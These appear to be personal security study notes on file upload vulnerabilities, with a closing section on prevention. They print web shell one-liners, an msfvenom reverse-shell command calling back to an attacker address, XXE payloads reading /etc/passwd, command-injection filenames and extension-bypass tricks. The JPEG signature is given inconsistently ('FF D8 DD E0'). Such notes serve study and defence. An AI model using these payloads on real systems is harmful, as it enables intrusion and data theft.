### General Notes

When web servers allow users to upload files without validations, this opens the door for remote code execution (RCE) vulnerabilities and [[Reverse Shells]].

> Severity depends on the amount of validation enforced.
* If file type isn't validated, then `php` shells can be uploaded.
* If name isn't validated, then important files can be replaced.
* If [[Directory Traversal]] is a vulnerability of that server, then attackers can upload files to any place.
* If file size isn't validated, DDOS attacks can take place by filling the disk space.
* Can be used to upload HTML files that can implement `javascript` code to carry out [[Cross Site Scripting (XSS)]] or [[CSRF]] attacks.


> The attack is basically uploading a file, then using [[HTTP]] follow-up requests to trigger it

---
### Handling Static Files

Server parses the path in the request to identify file extension. Determines the type of file by comparing it to a list of mappings between extensions and MIME types.

* If file is non-executable, server sends the file in [[HTTP]] response.
* If file is executable and server executes files, it will assign the variables with the given parameters and run the script. Output may be sent in HTTP response.
* If file is executable and server doesn't execute files, it will respond with an error. Sometimes the contents of the file may be served as plain text in a response.

> [[HTTP]] header `Content-Type` tells us what the server thinks the file type is.
> If the header isn't explicitly sent, it contains result of file extension/MIME mapping.

---

### Web Shell

##### Framework Identification

A malicious script that enables attackers to execute commands on a web server through [[HTTP]] requests sent to an endpoint. (where the shell resides).

> The web shell programming language used will be the language of the backend server. There are several techniques to identify this:
- Visit the `index` page, its extension is the language.
- Using the [wappalyzer](https://www.wappalyzer.com/) extension.

##### Examples

* `PHP` one-liner to read any file on the web server.
```PHP
<?php echo file_get_contents('/<path>'); ?>
```
> After this shell is uploaded, sending a request to it at the correct endpoint will execute it and the files contents will be displayed.

* Another `PHP` one-liner that allows for any command we enter to be executed.
```PHP
<?php echo system($_GET['command']); ?>
```
Where `command` is the parameter of the `GET` request being sent to the location where the shell was uploaded.

* One way of connecting to a web shell.
```
GET /url/shell.php?command=<command_here> HTTP/1.1
```

##### `/usr/share/webshells/`

There are famous reverse shells in this directory.
* Include inside them the [[IP]] address of the machine that they should connect to, and on what [[Port]].

##### Using `msfvenom`

Can use [[Metasploit]]s payload generator to make shells. (Reverse shells)

```bash
msfvenom -p <payload-to-use> LHOST=<our-ip> LPORT=<our-port> -f <output-format> > <filename>
```
- Some of the options to be set include the attacker machine [[Port]] and [[IP]] address to connect back to.

---
### Upload Directory Disclosure

This can be done through forcing error messages as these can give us information about the location of the file that induces this error.

* Very long name (5000 chars+).
* Upload a file that already exists.
* Send two identical requests simultaneously.

> Utilizing fuzzing and directory enumeration can also help.

---
### Flawed Validations

##### Type Validation

HTML forms are submitted using `POST` requests with `content-type` header set to `application/x-www-form-url-encoded` when sending text. But for large sizes the header is set to `multipart/form-data`.
* We can change the content-type header to whatever is required but leave our data as is. This will work if the server doesn't validate the type of the actual data.

> Done using [[Burp Suite]] repeater.

##### Preventing Execution in Some Directories

Servers can be configured to run scripts that they were only configured to run, not any other script.
* Instead of executing, they return the script in plain text or some error message.
- Can leak source code.

> This strict configuration is usually only in some directories that have some sort of user file upload.

We can try to upload files to other directories that might not have these strong defenses, one where user supplied scripts shouldn't be present.
- The `filename` field in form or multipart requests is used to determine where the file will be stored.

> Can modify the `filename` field using the techniques discovered in [[Directory Traversal]].

##### Insufficient Blacklisting of File Types

There are other file extensions that do the same job, and not all of them are blacklisted.
- One example is `phtml`.

###### Overriding Server Configuration

For [[Apache]] servers to execute files they need to be configured first.

- Developers need to add directives to the `/etc/apache2/apache2.conf` file.
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php
```

Servers allow developers to override default configurations and to create their own rules.
- For [[Apache]], they load this specific configuration from `.htaccess` file.
- For IIS,  they load this specific configuration from `.web.config` file.

We can upload our own configuration files to allow for malicious uploads to map arbitrary file extensions to executable MIME types if the ones we need are blacklisted.

> Do that by taking the directives written in the `apache2.conf` file and putting them in the the `.htaccess` file, but changing the `.php` in the end to another file extension, such as `.l33t`.

###### Obfuscating File Extensions - [wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

> The issue here lies within the regex, as it only checks whether the file name contains the extension and not if it actually ends with it.

- Try making the extensions with caps, and combinations of caps and lowercase.

- Provide multiple extensions: `mins.php.jpg` or `mins.jpg.php`.

- Add trailing characters: `mins.php.`

- Trying to URL encode, [[Web Encoding]], the dots and slashes: `mins%2Ephp`.

- Adding semicolons or null byte characters: `mins.php;.jpg` or `mins.php%00.jpg`. Other chars to inject:
```
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

- Multibyte Unicode character that can be converted to null bytes and dots. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

- If file extensions are stripped but not recursively: `mins.p.phphp`. Removes the middle .php and then the .p and hp combine to form .php.
 
###### File Content Validation

More secure servers verify that the contents of the file match what is expected and what is in the `content-type` header.
- Some servers do that by verifying properties of that file, such as the dimensions of an image.
- Some file types always contain a series of bytes in their headers or footers. These are like a signature for the files, such as `FF D8 FF E0` in the header of `JPEG` files. [Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

> Can use `hexedit` to edit the hex content of a file to add the signature in the beginning.
- So to make a `.php` file seen as `.jpeg` file, add the hex characters `FF D8 DD E0` in the beginning of the file.

> Can use the `exiftool`, a command line utility used to change and monitor the metadata of files.

- Take an image, and then add a comment with the `php` code for the shell.
```bash
exiftool -comment='<?php echo system($_GET['command']);?>' pic.jpeg
```

* To execute a [[Cross Site Scripting (XSS)]] attack, we can try to break out of tags.
```bash
exiftool -comment=' "><img src=1 onerror=alert(window.origin)>' pic.jpeg
```

> Changing the `content-type` header to `text/html` will change the image to HTML document, causing the payload to execute.

##### [[XXE Injection]] Attacks

* To read the contents of a file using an `svg` file upload:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

* To read the source code of `php` file using `svg` file upload:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

##### Command Injection Attacks

Placing a command in the uploaded file's name can lead to command execution

```bash
file$(whoami).jpg
file`whoami`.jpg
file.jpg|whoami
```

##### Race Conditions

Some websites upload the file directly, and then remove it after a short duration once its checked.
- The short time can enable the attacker to execute the scripts.
- Very hard to detect unless the source code is leaked.

> Fetch the response of the script quickly before the file is removed from the system.

---
### Windows Specific Attacks

* Using reserved characters like `| > < * ?`.
* Using reserved names like `CON COM1 LPT1 NUL`.

> These if not handled properly can lead to errors and [[Information Disclosure]].

Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name, which we can use to our advantage.
* For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`).

---
### Preventing File Upload Vulnerabilities

* Check file extension against a whitelist of permitted extensions, rather than a blacklist of blocked ones.
* Check the content of the file by checking both the MIME type and signature simultaneously.
* Make sure filename doesn't have any substrings that can be interpreted as directory traversal.
* Rename uploaded files to avoid collisions.
* Do not upload files to system until they are validated.
* Use an established framework for preprocessing files rather than making your own.

---
